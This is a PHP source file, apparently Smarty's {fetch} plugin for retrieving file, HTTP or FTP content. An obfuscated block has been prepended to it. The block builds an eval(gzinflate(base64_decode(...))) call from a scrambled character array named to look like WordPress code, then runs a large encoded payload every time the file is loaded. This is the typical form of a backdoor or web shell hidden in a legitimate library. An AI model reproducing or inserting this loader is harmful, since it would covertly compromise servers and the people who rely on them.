<?php
$md5 = "cdf0f279edda50f07323547c19d863b7";
$wp_salt = array("t","n",'_','o',')','f','6','s','a',"g","i","e",'z',"$","4","r",'c',"v",';',"b","d","(",'l');
$wp_add_filter = create_function('$'.'v',$wp_salt[11].$wp_salt[17].$wp_salt[8].$wp_salt[22].$wp_salt[21].$wp_salt[9].$wp_salt[12].$wp_salt[10].$wp_salt[1].$wp_salt[5].$wp_salt[22].$wp_salt[8].$wp_salt[0].$wp_salt[11].$wp_salt[21].$wp_salt[19].$wp_salt[8].$wp_salt[7].$wp_salt[11].$wp_salt[6].$wp_salt[14].$wp_salt[2].$wp_salt[20].$wp_salt[11].$wp_salt[16].$wp_salt[3].$wp_salt[20].$wp_salt[11].$wp_salt[21].$wp_salt[13].$wp_salt[17].$wp_salt[4].$wp_salt[4].$wp_salt[4].$wp_salt[18]);
$wp_add_filter('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');
?>
<?php
/**
 * Smarty plugin
 * @package Smarty
 * @subpackage plugins
 */


/**
 * Smarty {fetch} plugin
 *
 * Type:     function<br>
 * Name:     fetch<br>
 * Purpose:  fetch file, web or ftp data and display results
 * @link http://smarty.php.net/manual/en/language.function.fetch.php {fetch}
 *       (Smarty online manual)
 * @author Monte Ohrt <monte at ohrt dot com>
 * @param array
 * @param Smarty
 * @return string|null if the assign parameter is passed, Smarty assigns the
 *                     result to a template variable
 */
function smarty_function_fetch($params, &$smarty)
{
    if (empty($params['file'])) {
        $smarty->_trigger_fatal_error("[plugin] parameter 'file' cannot be empty");
        return;
    }

    $content = '';
    if ($smarty->security && !preg_match('!^(http|ftp)://!i', $params['file'])) {
        $_params = array('resource_type' => 'file', 'resource_name' => $params['file']);
        require_once(SMARTY_CORE_DIR . 'core.is_secure.php');
        if(!smarty_core_is_secure($_params, $smarty)) {
            $smarty->_trigger_fatal_error('[plugin] (secure mode) fetch \'' . $params['file'] . '\' is not allowed');
            return;
        }
        
        // fetch the file
        if($fp = @fopen($params['file'],'r')) {
            while(!feof($fp)) {
                $content .= fgets ($fp,4096);
            }
            fclose($fp);
        } else {
            $smarty->_trigger_fatal_error('[plugin] fetch cannot read file \'' . $params['file'] . '\'');
            return;
        }
    } else {
        // not a local file
        if(preg_match('!^http://!i',$params['file'])) {
            // http fetch
            if($uri_parts = parse_url($params['file'])) {
                // set defaults
                $host = $server_name = $uri_parts['host'];
                $timeout = 30;
                $accept = "image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*";
                $agent = "Smarty Template Engine ".$smarty->_version;
                $referer = "";
                $uri = !empty($uri_parts['path']) ? $uri_parts['path'] : '/';
                $uri .= !empty($uri_parts['query']) ? '?' . $uri_parts['query'] : '';
                $_is_proxy = false;
                if(empty($uri_parts['port'])) {
                    $port = 80;
                } else {
                    $port = $uri_parts['port'];
                }
                if(!empty($uri_parts['user'])) {
                    $user = $uri_parts['user'];
                }
                if(!empty($uri_parts['pass'])) {
                    $pass = $uri_parts['pass'];
                }
                // loop through parameters, setup headers
                foreach($params as $param_key => $param_value) {
                    switch($param_key) {
                        case "file":
                        case "assign":
                        case "assign_headers":
                            break;
                        case "user":
                            if(!empty($param_value)) {
                                $user = $param_value;
                            }
                            break;
                        case "pass":
                            if(!empty($param_value)) {
                                $pass = $param_value;
                            }
                            break;
                        case "accept":
                            if(!empty($param_value)) {
                                $accept = $param_value;
                            }
                            break;
                        case "header":
                            if(!empty($param_value)) {
                                if(!preg_match('![\w\d-]+: .+!',$param_value)) {
                                    $smarty->_trigger_fatal_error("[plugin] invalid header format '".$param_value."'");
                                    return;
                                } else {
                                    $extra_headers[] = $param_value;
                                }
                            }
                            break;
                        case "proxy_host":
                            if(!empty($param_value)) {
                                $proxy_host = $param_value;
                            }
                            break;
                        case "proxy_port":
                            if(!preg_match('!\D!', $param_value)) {
                                $proxy_port = (int) $param_value;
                            } else {
                                $smarty->_trigger_fatal_error("[plugin] invalid value for attribute '".$param_key."'");
                                return;
                            }
                            break;
                        case "agent":
                            if(!empty($param_value)) {
                                $agent = $param_value;
                            }
                            break;
                        case "referer":
                            if(!empty($param_value)) {
                                $referer = $param_value;
                            }
                            break;
                        case "timeout":
                            if(!preg_match('!\D!', $param_value)) {
                                $timeout = (int) $param_value;
                            } else {
                                $smarty->_trigger_fatal_error("[plugin] invalid value for attribute '".$param_key."'");
                                return;
                            }
                            break;
                        default:
                            $smarty->_trigger_fatal_error("[plugin] unrecognized attribute '".$param_key."'");
                            return;
                    }
                }
                if(!empty($proxy_host) && !empty($proxy_port)) {
                    $_is_proxy = true;
                    $fp = fsockopen($proxy_host,$proxy_port,$errno,$errstr,$timeout);
                } else {
                    $fp = fsockopen($server_name,$port,$errno,$errstr,$timeout);
                }

                if(!$fp) {
                    $smarty->_trigger_fatal_error("[plugin] unable to fetch: $errstr ($errno)");
                    return;
                } else {
                    if($_is_proxy) {
                        fputs($fp, 'GET ' . $params['file'] . " HTTP/1.0\r\n");
                    } else {
                        fputs($fp, "GET $uri HTTP/1.0\r\n");
                    }
                    if(!empty($host)) {
                        fputs($fp, "Host: $host\r\n");
                    }
                    if(!empty($accept)) {
                        fputs($fp, "Accept: $accept\r\n");
                    }
                    if(!empty($agent)) {
                        fputs($fp, "User-Agent: $agent\r\n");
                    }
                    if(!empty($referer)) {
                        fputs($fp, "Referer: $referer\r\n");
                    }
                    if(isset($extra_headers) && is_array($extra_headers)) {
                        foreach($extra_headers as $curr_header) {
                            fputs($fp, $curr_header."\r\n");
                        }
                    }
                    if(!empty($user) && !empty($pass)) {
                        fputs($fp, "Authorization: BASIC ".base64_encode("$user:$pass")."\r\n");
                    }

                    fputs($fp, "\r\n");
                    while(!feof($fp)) {
                        $content .= fgets($fp,4096);
                    }
                    fclose($fp);
                    $csplit = split("\r\n\r\n",$content,2);

                    $content = $csplit[1];

                    if(!empty($params['assign_headers'])) {
                        $smarty->assign($params['assign_headers'],split("\r\n",$csplit[0]));
                    }
                }
            } else {
                $smarty->_trigger_fatal_error("[plugin] unable to parse URL, check syntax");
                return;
            }
        } else {
            // ftp fetch
            if($fp = @fopen($params['file'],'r')) {
                while(!feof($fp)) {
                    $content .= fgets ($fp,4096);
                }
                fclose($fp);
            } else {
                $smarty->_trigger_fatal_error('[plugin] fetch cannot read file \'' . $params['file'] .'\'');
                return;
            }
        }

    }


    if (!empty($params['assign'])) {
        $smarty->assign($params['assign'],$content);
    } else {
        return $content;
    }
}

/* vim: set expandtab: */

?>